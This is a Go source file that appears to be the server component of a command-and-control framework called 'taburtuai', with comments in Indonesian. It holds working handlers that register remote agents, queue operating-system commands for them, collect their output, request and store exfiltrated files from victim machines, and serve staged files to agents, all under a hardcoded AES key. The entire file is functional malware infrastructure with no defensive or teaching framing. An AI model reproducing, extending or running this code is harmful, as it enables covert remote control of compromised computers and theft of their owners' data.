package handlers

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"

	"taburtuai/task"
	"taburtuai/utils"
)

var (
	agents = make(map[string]string)
	mu     sync.Mutex
)

const encryptionKey = "SpookyOrcaC2AES1"
const exfilDir = "exfiltrated_files" // Direktori untuk menyimpan file yang dieksfiltrasi

func init() {
	if err := os.MkdirAll(exfilDir, os.ModePerm); err != nil {
		log.Fatalf("[-] Failed to create exfiltration directory: %v", err)
	}
}

// PingHandler: Agent memanggil endpoint ini utk ambil command
func PingHandler(w http.ResponseWriter, r *http.Request) {
	encryptedInfo := r.URL.Query().Get("info")
	decryptedInfo, err := utils.DecryptAES(encryptedInfo, encryptionKey)
	if err != nil {
		log.Printf("[-] Failed to decrypt agent info: %v", err)
		http.Error(w, "Failed to decrypt", http.StatusBadRequest)
		return
	}

	parts := strings.Split(decryptedInfo, "|")
	if len(parts) != 2 {
		log.Println("[-] Invalid decrypted data format")
		http.Error(w, "Invalid data format", http.StatusBadRequest)
		return
	}

	hostname, id := parts[0], parts[1]

	mu.Lock()
	if hostname != "" && id != "" {
		if _, exists := agents[id]; !exists {
			agents[id] = hostname
			log.Printf("[+] New agent connected: %s (ID: %s)", hostname, id)
		}
	}
	mu.Unlock()

	if task.HasTask(id) {
		cmd := task.GetTask(id)
		encryptedCommand, _ := utils.EncryptAES(cmd, encryptionKey)
		fmt.Fprint(w, encryptedCommand)
	} else {
		w.WriteHeader(http.StatusNoContent)
	}
}

// ResultHandler: Menerima hasil command atau exfil dari agent
func ResultHandler(w http.ResponseWriter, r *http.Request) {
	id := r.URL.Query().Get("id")
	cmdType := r.URL.Query().Get("type")      // "cmd" atau "exfil"
	filename := r.URL.Query().Get("filename") // Untuk exfil

	if id == "" || cmdType == "" {
		http.Error(w, "Invalid agent ID or command type", http.StatusBadRequest)
		return
	}

	resultBytes, err := io.ReadAll(r.Body)
	if err != nil {
		log.Printf("[-] Failed to read request body: %v\n", err)
		http.Error(w, "Failed to read data", http.StatusInternalServerError)
		return
	}
	defer r.Body.Close()

	decryptedResult, err := utils.DecryptAES(string(resultBytes), encryptionKey)
	if err != nil {
		log.Printf("[-] Failed to decrypt agent result: %v\n", err)
		http.Error(w, "Failed to decrypt result", http.StatusBadRequest)
		return
	}

	// Hasil perintah OS
	if cmdType == "cmd" {
		log.Printf("[+] Command result from agent %s: %s\n", id, decryptedResult)
		fmt.Fprint(w, "Command result received")
		return
	}

	// Hasil exfil file
	if cmdType == "exfil" && filename != "" {
		cleanFilename := filepath.Base(filename) // Hindari path traversal
		filePath := filepath.Join(exfilDir, cleanFilename)
		if err := os.WriteFile(filePath, []byte(decryptedResult), 0644); err != nil {
			log.Printf("[-] Failed to save file %s: %v\n", filePath, err)
			http.Error(w, "Failed to save file", http.StatusInternalServerError)
			return
		}

		log.Printf("[+] Exfiltrated file saved: %s\n", filePath)
		fmt.Fprint(w, "File received successfully")
		return
	}

	http.Error(w, "Invalid request type", http.StatusBadRequest)
}

// CommandHandler: Menerima command dari operator lalu queue ke agent
func CommandHandler(w http.ResponseWriter, r *http.Request) {
	id := r.URL.Query().Get("id")
	cmd := r.URL.Query().Get("cmd")
	if id == "" || cmd == "" {
		http.Error(w, "Agent ID and command required", http.StatusBadRequest)
		return
	}
	task.AddTask(id, cmd)
	log.Printf("[*] New command queued for agent %s: %s", id, cmd)
	fmt.Fprint(w, "Command queued for agent")
}

// ExfilHandler: Minta agent mengirim file (exfil)
func ExfilHandler(w http.ResponseWriter, r *http.Request) {
	id := r.URL.Query().Get("id")
	filename := r.URL.Query().Get("filename")
	if id == "" || filename == "" {
		http.Error(w, "Agent ID and filename required", http.StatusBadRequest)
		return
	}
	task.AddTask(id, "EXFIL|"+filename)
	log.Printf("[*] Requesting file %s from agent %s", filename, id)
	fmt.Fprint(w, "Exfiltration request sent")
}

// UploadHandler: Operator meng-upload file ke server
func UploadHandler(w http.ResponseWriter, r *http.Request) {
	filename := r.URL.Query().Get("filename")
	if filename == "" {
		http.Error(w, "Filename required", http.StatusBadRequest)
		return
	}

	file, _, err := r.FormFile("file")
	if err != nil {
		http.Error(w, "Failed to read form file", http.StatusBadRequest)
		return
	}
	defer file.Close()

	os.MkdirAll("uploaded_files", 0755)
	dstPath := filepath.Join("uploaded_files", filepath.Base(filename))

	dst, err := os.Create(dstPath)
	if err != nil {
		http.Error(w, "Failed to create file on server", http.StatusInternalServerError)
		return
	}
	defer dst.Close()

	_, err = io.Copy(dst, file)
	if err != nil {
		http.Error(w, "Failed to save file", http.StatusInternalServerError)
		return
	}

	log.Printf("[+] File uploaded to: %s\n", dstPath)
	fmt.Fprint(w, "File uploaded successfully")
}

// DownloadHandler: Agent mendownload file dari server
func DownloadHandler(w http.ResponseWriter, r *http.Request) {
	filename := r.URL.Query().Get("filename")
	if filename == "" {
		http.Error(w, "Filename required", http.StatusBadRequest)
		return
	}

	filePath := filepath.Join("uploaded_files", filepath.Base(filename))
	f, err := os.Open(filePath)
	if err != nil {
		http.Error(w, "File not found", http.StatusNotFound)
		return
	}
	defer f.Close()

	w.Header().Set("Content-Disposition", "attachment; filename="+filepath.Base(filename))
	_, err = io.Copy(w, f)
	if err != nil {
		log.Printf("[-] Failed to send file %s: %v\n", filePath, err)
	}
	log.Printf("[+] Sending file to agent: %s\n", filePath)
}
